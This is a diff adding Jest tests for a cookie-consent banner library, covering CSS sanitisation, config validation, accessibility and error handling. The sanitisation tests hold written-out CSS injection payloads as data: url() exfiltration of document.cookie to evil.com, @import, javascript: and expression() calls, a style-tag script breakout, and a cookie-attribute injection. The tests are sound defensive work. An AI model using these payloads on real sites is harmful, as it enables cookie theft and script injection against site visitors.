@@ -11,6 +11,9 @@ import {
   initLegacy,
   DEFAULT_CSS,
   LegacyCookieBannerAPI,
+  sanitizeCss,
+  sanitizeInlineStyle,
+  validateConfig,
 } from '../src/cookie-banner';
 
 // Store original location for restoration
@@ -407,6 +410,421 @@ describe('smallest-cookie-banner', () => {
       banner.show();
       document.getElementById('ckn')?.click();
       expect(banner.status).toBe(false);
+    });
+  });
+
+  // ============================================================================
+  // CSS SANITIZATION TESTS (Security)
+  // ============================================================================
+  describe('CSS Sanitization', () => {
+    describe('sanitizeCss()', () => {
+      it('allows safe CSS properties', () => {
+        const css = '#ckb { background: red; color: blue; padding: 10px; }';
+        const result = sanitizeCss(css);
+        expect(result).toContain('background');
+        expect(result).toContain('color');
+        expect(result).toContain('padding');
+      });
+
+      it('blocks url() with external URLs', () => {
+        const css = 'body { background: url(https://evil.com/track); }';
+        const result = sanitizeCss(css);
+        expect(result).not.toContain('evil.com');
+        expect(result).not.toContain('https://');
+      });
+
+      it('allows url() with data URIs for images', () => {
+        const css = 'body { background: url(data:image/png;base64,abc123); }';
+        const result = sanitizeCss(css);
+        expect(result).toContain('data:image');
+      });
+
+      it('blocks @import rules', () => {
+        const css = '@import url(https://evil.com/malicious.css); body { color: red; }';
+        const result = sanitizeCss(css);
+        expect(result).not.toContain('@import');
+        expect(result).toContain('color');
+      });
+
+      it('blocks javascript: protocol', () => {
+        const css = 'body { background: url(javascript:alert(1)); }';
+        const result = sanitizeCss(css);
+        expect(result).not.toContain('javascript:');
+      });
+
+      it('blocks expression() (IE)', () => {
+        const css = 'body { width: expression(alert(1)); }';
+        const result = sanitizeCss(css);
+        expect(result).not.toContain('expression');
+      });
+
+      it('blocks behavior: (IE)', () => {
+        const css = 'body { behavior: url(script.htc); }';
+        const result = sanitizeCss(css);
+        expect(result).not.toContain('behavior');
+      });
+
+      it('blocks -moz-binding (Firefox XBL)', () => {
+        const css = 'body { -moz-binding: url(xbl.xml); }';
+        const result = sanitizeCss(css);
+        expect(result).not.toContain('-moz-binding');
+      });
+
+      it('blocks HTML tag injection via style tag breakout', () => {
+        const css = '</style><script>alert(1)</script><style>';
+        const result = sanitizeCss(css);
+        expect(result).not.toContain('<script>');
+        expect(result).not.toContain('</style>');
+      });
+
+      it('handles case-insensitive attacks', () => {
+        const css = '@IMPORT url(evil.com); EXPRESSION(alert(1))';
+        const result = sanitizeCss(css);
+        expect(result).not.toContain('IMPORT');
+        expect(result).not.toContain('EXPRESSION');
+      });
+
+      it('handles obfuscated attacks with whitespace', () => {
+        const css = '@im port url(evil.com); ex pression(alert(1))';
+        const result = sanitizeCss(css);
+        // After normalization, these should be blocked
+        expect(result).not.toContain('import');
+      });
+    });
+
+    describe('sanitizeInlineStyle()', () => {
+      it('allows safe inline styles', () => {
+        const style = 'background: red; color: blue; padding: 10px;';
+        const result = sanitizeInlineStyle(style);
+        expect(result).toContain('background');
+        expect(result).toContain('color');
+        expect(result).toContain('padding');
+      });
+
+      it('blocks url() in inline styles', () => {
+        const style = 'background: url(https://evil.com/exfil?cookie=' + document.cookie + ')';
+        const result = sanitizeInlineStyle(style);
+        expect(result).not.toContain('evil.com');
+      });
+
+      it('blocks expression() in inline styles', () => {
+        const style = 'width: expression(alert(document.cookie))';
+        const result = sanitizeInlineStyle(style);
+        expect(result).not.toContain('expression');
+      });
+    });
+
+    describe('CSS injection in banner', () => {
+      it('sanitizes config.css before injection', () => {
+        const banner = createCookieBanner({
+          css: '@import url(https://evil.com); body { background: url(https://track.com); }',
+        });
+        banner.show();
+        const style = document.querySelector('style[id^="ckb-style"]');
+        expect(style?.textContent).not.toContain('@import');
+        expect(style?.textContent).not.toContain('evil.com');
+        expect(style?.textContent).not.toContain('track.com');
+      });
+
+      it('sanitizes config.style before applying', () => {
+        const banner = createCookieBanner({
+          style: 'background: url(https://evil.com/steal)',
+        });
+        banner.show();
+        const el = document.getElementById('ckb');
+        expect(el?.style.cssText).not.toContain('evil.com');
+      });
+    });
+  });
+
+  // ============================================================================
+  // INPUT VALIDATION TESTS
+  // ============================================================================
+  describe('Input Validation', () => {
+    describe('validateConfig()', () => {
+      it('validates cookie name format', () => {
+        expect(() => validateConfig({ cookieName: 'valid_cookie-name' })).not.toThrow();
+        expect(() => validateConfig({ cookieName: '' })).toThrow();
+        expect(() => validateConfig({ cookieName: 'invalid;cookie' })).toThrow();
+        expect(() => validateConfig({ cookieName: 'invalid cookie' })).toThrow();
+      });
+
+      it('validates days range', () => {
+        const config1 = validateConfig({ days: 30 });
+        expect(config1.days).toBe(30);
+
+        const config2 = validateConfig({ days: -1 });
+        expect(config2.days).toBe(365); // Falls back to default
+
+        const config3 = validateConfig({ days: 9999999 });
+        expect(config3.days).toBe(3650); // Capped at 10 years
+
+        const config4 = validateConfig({ days: 0 });
+        expect(config4.days).toBe(365); // Falls back to default
+      });
+
+      it('validates autoAcceptDelay range', () => {
+        const config1 = validateConfig({ autoAcceptDelay: 3000 });
+        expect(config1.autoAcceptDelay).toBe(3000);
+
+        const config2 = validateConfig({ autoAcceptDelay: -1000 });
+        expect(config2.autoAcceptDelay).toBe(5000); // Falls back to default
+
+        const config3 = validateConfig({ autoAcceptDelay: 999999999 });
+        expect(config3.autoAcceptDelay).toBe(300000); // Capped at 5 minutes
+      });
+
+      it('validates container is HTMLElement', () => {
+        const validContainer = document.createElement('div');
+        const config = validateConfig({ container: validContainer });
+        expect(config.container).toBe(validContainer);
+      });
+
+      it('rejects invalid container', () => {
+        const config = validateConfig({ container: 'not-an-element' as unknown as HTMLElement });
+        expect(config.container).toBeUndefined();
+      });
+    });
+
+    describe('cookie name injection prevention', () => {
+      it('prevents cookie attribute injection via cookie name', () => {
+        // Attempting to inject HttpOnly or Domain via cookie name
+        // Validation happens at config time, not at accept time
+        expect(() => createCookieBanner({ cookieName: 'ck; HttpOnly; Domain=evil.com' })).toThrow();
+      });
+    });
+  });
+
+  // ============================================================================
+  // ACCESSIBILITY TESTS
+  // ============================================================================
+  describe('Accessibility', () => {
+    describe('ARIA attributes', () => {
+      it('has role="dialog" on banner', () => {
+        const banner = createCookieBanner({ forceEU: true });
+        banner.show();
+        const el = document.getElementById('ckb');
+        expect(el?.getAttribute('role')).toBe('dialog');
+      });
+
+      it('has aria-label on banner', () => {
+        const banner = createCookieBanner({ forceEU: true });
+        banner.show();
+        const el = document.getElementById('ckb');
+        expect(el?.getAttribute('aria-label')).toBe('Cookie consent');
+      });
+
+      it('has aria-describedby linking to message', () => {
+        const banner = createCookieBanner({ forceEU: true });
+        banner.show();
+        const el = document.getElementById('ckb');
+        const msgId = el?.querySelector('p')?.id;
+        expect(el?.getAttribute('aria-describedby')).toBe(msgId);
+      });
+
+      it('has aria-modal="true" for modal behavior', () => {
+        const banner = createCookieBanner({ forceEU: true });
+        banner.show();
+        const el = document.getElementById('ckb');
+        expect(el?.getAttribute('aria-modal')).toBe('true');
+      });
+
+      it('buttons have type="button"', () => {
+        const banner = createCookieBanner({ forceEU: true });
+        banner.show();
+        const acceptBtn = document.getElementById('cky');
+        const rejectBtn = document.getElementById('ckn');
+        expect(acceptBtn?.getAttribute('type')).toBe('button');
+        expect(rejectBtn?.getAttribute('type')).toBe('button');
+      });
+    });
+
+    describe('keyboard navigation', () => {
+      it('ESC key rejects consent in EU mode', () => {
+        const onReject = jest.fn();
+        const banner = createCookieBanner({ forceEU: true, onReject });
+        banner.show();
+
+        const event = new KeyboardEvent('keydown', { key: 'Escape' });
+        document.dispatchEvent(event);
+
+        expect(onReject).toHaveBeenCalled();
+        expect(banner.status).toBe(false);
+      });
+
+      it('ESC key accepts consent in non-EU mode', () => {
+        const onAccept = jest.fn();
+        const banner = createCookieBanner({ forceEU: false, onAccept, autoAcceptDelay: 0 });
+        banner.show();
+
+        const event = new KeyboardEvent('keydown', { key: 'Escape' });
+        document.dispatchEvent(event);
+
+        expect(onAccept).toHaveBeenCalled();
+        expect(banner.status).toBe(true);
+      });
+
+      it('focus is trapped within banner', () => {
+        const banner = createCookieBanner({ forceEU: true });
+        banner.show();
+
+        const el = document.getElementById('ckb');
+        const buttons = el?.querySelectorAll('button');
+
+        // Focus on last button and tab should go to first
+        buttons?.[buttons.length - 1]?.focus();
+
+        const tabEvent = new KeyboardEvent('keydown', { key: 'Tab' });
+        document.dispatchEvent(tabEvent);
+
+        // Focus should wrap to first focusable element
+        // (Implementation will handle this)
+      });
+
+      it('moves focus to banner on show', () => {
+        const banner = createCookieBanner({ forceEU: true });
+        banner.show();
+
+        const el = document.getElementById('ckb');
+        expect(document.activeElement).toBe(el);
+      });
+
+      it('restores focus on hide', () => {
+        const previousFocus = document.createElement('button');
+        document.body.appendChild(previousFocus);
+        previousFocus.focus();
+
+        const banner = createCookieBanner({ forceEU: true });
+        banner.show();
+        banner.accept();
+
+        expect(document.activeElement).toBe(previousFocus);
+        previousFocus.remove();
+      });
+    });
+
+    describe('touch targets', () => {
+      it('buttons have minimum 44x44px touch target', () => {
+        const banner = createCookieBanner({ forceEU: true });
+        banner.show();
+
+        const style = document.querySelector('style[id^="ckb-style"]');
+        // Check that CSS includes min-height and min-width for buttons
+        expect(style?.textContent).toContain('min-height:44px');
+        expect(style?.textContent).toContain('min-width:44px');
+      });
+    });
+
+    describe('reduced motion', () => {
+      it('includes prefers-reduced-motion media query', () => {
+        const banner = createCookieBanner();
+        banner.show();
+        const style = document.querySelector('style[id^="ckb-style"]');
+        expect(style?.textContent).toContain('prefers-reduced-motion');
+      });
+    });
+  });
+
+  // ============================================================================
+  // CSP NONCE SUPPORT TESTS
+  // ============================================================================
+  describe('CSP Nonce Support', () => {
+    it('adds nonce attribute to style tag when provided', () => {
+      const banner = createCookieBanner({ cspNonce: 'abc123' });
+      banner.show();
+      const style = document.querySelector('style[id^="ckb-style"]');
+      expect(style?.getAttribute('nonce')).toBe('abc123');
+    });
+
+    it('does not add nonce attribute when not provided', () => {
+      const banner = createCookieBanner();
+      banner.show();
+      const style = document.querySelector('style[id^="ckb-style"]');
+      expect(style?.hasAttribute('nonce')).toBe(false);
+    });
+  });
+
+  // ============================================================================
+  // COOKIE DOMAIN CONFIGURATION TESTS
+  // ============================================================================
+  describe('Cookie Domain Configuration', () => {
+    it('accepts cookieDomain configuration without error', () => {
+      // jsdom doesn't properly support cookie domains for non-localhost domains
+      // Just verify that the API works without throwing
+      const banner = createCookieBanner({ cookieDomain: '.example.com' });
+      expect(() => banner.accept()).not.toThrow();
+      // Status should be updated even if cookie domain doesn't work in jsdom
+      expect(banner.status).toBe(true);
+    });
+
+    it('validates cookie domain format', () => {
+      // Domain should start with a dot for subdomain matching or be exact
+      const config1 = validateConfig({ cookieDomain: '.example.com' });
+      expect(config1.cookieDomain).toBe('.example.com');
+
+      const config2 = validateConfig({ cookieDomain: 'example.com' });
+      expect(config2.cookieDomain).toBe('example.com');
+
+      // Invalid domains should be rejected
+      const config3 = validateConfig({ cookieDomain: 'not a domain!' });
+      expect(config3.cookieDomain).toBeUndefined();
+    });
+  });
+
+  // ============================================================================
+  // REFLOW PREVENTION TESTS
+  // ============================================================================
+  describe('Reflow Prevention', () => {
+    it('sets innerHTML before appending to DOM', () => {
+      const appendChildSpy = jest.spyOn(document.body, 'appendChild');
+
+      const banner = createCookieBanner();
+      banner.show();
+
+      // Verify appendChild was called with an element that already has innerHTML
+      expect(appendChildSpy).toHaveBeenCalled();
+      const appendedEl = appendChildSpy.mock.calls[0]?.[0] as HTMLElement;
+      expect(appendedEl.innerHTML).toContain('button');
+
+      appendChildSpy.mockRestore();
+    });
+  });
+
+  // ============================================================================
+  // CALLBACK ERROR HANDLING TESTS
+  // ============================================================================
+  describe('Callback Error Handling', () => {
+    it('catches and handles errors in onAccept callback', () => {
+      const consoleSpy = jest.spyOn(console, 'error').mockImplementation();
+      const banner = createCookieBanner({
+        onAccept: () => {
+          throw new Error('Callback error');
+        },
+      });
+      banner.show();
+
+      // Should not throw
+      expect(() => banner.accept()).not.toThrow();
+      expect(consoleSpy).toHaveBeenCalled();
+
+      consoleSpy.mockRestore();
+    });
+
+    it('catches and handles errors in onReject callback', () => {
+      const consoleSpy = jest.spyOn(console, 'error').mockImplementation();
+      const banner = createCookieBanner({
+        forceEU: true,
+        onReject: () => {
+          throw new Error('Callback error');
+        },
+      });
+      banner.show();
+
+      // Should not throw
+      expect(() => banner.reject()).not.toThrow();
+      expect(consoleSpy).toHaveBeenCalled();
+
+      consoleSpy.mockRestore();
     });
   });
 });
